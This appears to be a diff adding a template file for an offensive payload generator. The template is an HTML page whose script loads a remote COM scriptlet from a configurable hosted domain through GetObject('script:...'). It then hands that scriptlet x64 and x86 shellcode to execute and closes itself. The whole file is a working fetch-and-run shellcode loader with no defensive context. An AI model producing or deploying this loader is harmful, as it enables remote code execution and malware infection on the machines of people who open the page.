@@ -1,0 +1,23 @@
+[ShellCodex64]
+value: notSet
+
+[ShellCodex86]
+value: notSet
+
+[Hosted Domain]
+value: notSet
+
+[Hosted Sct]
+value: notSet
+
+[Template]
+data:
+	<html>
+		<script>
+			var a = GetObject('script:${Hosted Domain:value}/${Hosted Sct:value}');
+			var x64 = "${ShellCodex64:value}"
+			var x86 = "${ShellCodex86:value}"
+			a.Exec(x86, x64);
+			close();
+		</script>
+	</html>
